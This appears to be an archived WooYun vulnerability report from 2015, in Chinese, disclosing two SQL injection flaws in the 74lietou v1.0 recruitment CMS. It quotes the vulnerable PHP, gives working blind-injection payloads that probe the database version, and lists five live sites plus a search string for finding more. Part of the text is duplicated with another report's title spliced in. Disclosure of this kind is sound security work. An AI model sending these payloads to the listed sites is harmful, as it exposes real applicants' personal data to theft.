{"id": 68853, "wybug_id": "wooyun-2015-0128454", "wybug_title": "74lietou v1.0最新注入2处(可获取部分数据)", "wybug_corp": "74c,s.com", "wybug_author": "Xser", "wybug_date": "2015-07-23 12:09", "wybug_open_date": "2015-10-26 12:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-28：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向公众公开  简要描述： 官网地址：http://74lietou.74cms.com/ 详细说明：  在/plus/ajax_user.php中\nelseif($act == 'only_check_language'){ $lang = trim($_POST['param'])?trim($_POST['param']):exit(\"选择语言不能为空！\"); $sql = \"select * from \".table('resume_language').\" where language = \".$lang.\" and uid = \".$_SESSION['uid']; $userinfo=$db->getone($sql); if ($userinfo) { exit(\"已经选择此语言!\"); }else{ exit(\"y\"); }\n POST值过来，没有单引号包含，导致注入http://74lietou.74cms.com/plus/ajax_user.php?act=only_check_languagePOST值\nparam=12' ||%20left(version(),1)%20between%200%20and%205--%20a\n这样猜解数据库版本第一位是0到5之间，返回已经选择此语言!\nparam=12' ||%20left(version(),1)%20between%200%20and%204--%20a\n这样猜解数据库版本第一位是0到4之间，返回y\n\n\n\n第二处出现在/user/company/company_recruitment.php中\nelseif($act ==\"export_resume\") { $yid =!empty($_REQUEST['y_id'])?$_REQUEST['y_id']:showmsg(\"你没有选择简历！\",1); if(!export_resume($yid)){ showmsg(\"导出失败！\",0); }\n 跟踪export_resume \nfunction export_resume($yid){ global $db; if(is_array($yid) && !empty($yid)) { $yid_str = implode(\",\", $yid); } else { $yid_str=$yid; } $oederbysql=\" order BY refreshtime desc \"; $wheresql = empty($wheresql)?\" id in ({$yid_str}) \":\" and id in ({$yid_str}) \"; if (!empty($wheresql)) { $wheresql=\" WHERE \".ltrim(ltrim($wheresql),'AND'); } $data = $db->getall(\"select * from \".table('resume').$wheresql);\n$_REQUEST['y_id']没有被过滤导致过滤，这个要登录而且要被审核就不用官网演示了本地测试！\n\n\n\n一样用POST值\n' ||%20left(version(),1)%20between%200%20and%205--%20a\n这样猜解数据库版本第一位是0到5之间\n' ||%20left(version(),1)%20between%200%20and%204--%20a\n这样猜解数据库版本第一位是0到4之间这样的办法就可以注入了，这个不演示了案例：关键字Powered by 74lietou v1.0\nhttp://www.5i5s.com/plus/ajax_user.php?act=only_check_languagehttp://lietou.hi772.com/plus/ajax_user.php?act=only_check_languagehttp://www.haolietou.com/plus/ajax_user.php?act=only_check_languagehttp://74lietou.74cms.com/plus/ajax_user.php?act=only_check_languagehttp://www.elancejob.com/plus/ajax_user.php?act=only_check_language\n   漏洞证明：  在/plus/ajax_user.php中\nelseif($act == 'only_check_language'){ $lang = trim($_POST['param'])?trim($_POST['param']):exit(\"选择语言不能为空！\"); $sql = \"select * from \".table('resume_language').\" where language = \".$lang.\" and uid = \".$_SESSION['uid']; $userinfo=$db->getone($sql); if ($userinfo) { exit(\"已经选择此语言!\"); }else{ exit(\"y\"); }\n POST值过来，没有单引号包含，导致注入http://74lietou.74cms.com/plus/ajax_user.php?act=only_check_languagePOST值\nparam=12' ||%20left(version(),1)%20between%200%20and%205--%20a\n这样猜解数据库版本第一位是0到5之间，返回已经选择此语言!\nparam=12' ||%20left(version(),1)%20between%200%20and%204--%20a\n这样猜解数据库版本第一位是0到4之间，返回y\n\n\n\n第二处出现在/user/company/company_recruitment.php中\nelseif($act ==\"export_resume\") { $yid =!empty($_REQUEST['y_id'])?$_REQUEST['y_id']:showmsg(\"你没有选择简历！\",1); if(!export_resume($yid)){ showmsg(\"导出失败！\",0); }\n 跟踪export_resume \nfunction export_resume($yid){ global $db; if(is_array($yid) && !empty($yid)) { $yid_str = implode(\",\", $yid); } else { $yid_str=$yid; } $oederbysql=\" order BY refreshtime desc \"; $wheresql = empty($wheresql)?\" id in ({$yid_str}) \":\" and id in ({$yid_str}) \"; if (!empty($wheresql)) { $wheresql=\" WHERE \".ltrim(ltrim($wheresql),'AND'); } $data = $db->getall(\"select * from \".table('resume').$wheresql);\n$_REQUEST['y_id']没有被过滤导致过滤，这个要登录而且要被审核就不用官网演示了本地测试！\n\n\n\n一样用POST值74lietou v1.0最新绕过全局防御注入2处(官网演示)这样的办法就可以注入了，这个不演示了案例：关键字Powered by 74lietou v1.0\nhttp://www.5i5s.com/plus/ajax_user.php?act=only_check_languagehttp://lietou.hi772.com/plus/ajax_user.php?act=only_check_languagehttp://www.haolietou.com/plus/ajax_user.php?act=only_check_languagehttp://74lietou.74cms.com/plus/ajax_user.php?act=only_check_languagehttp://www.elancejob.com/plus/ajax_user.php?act=only_check_language\n   修复方案：  过滤   版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-26 12:10 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}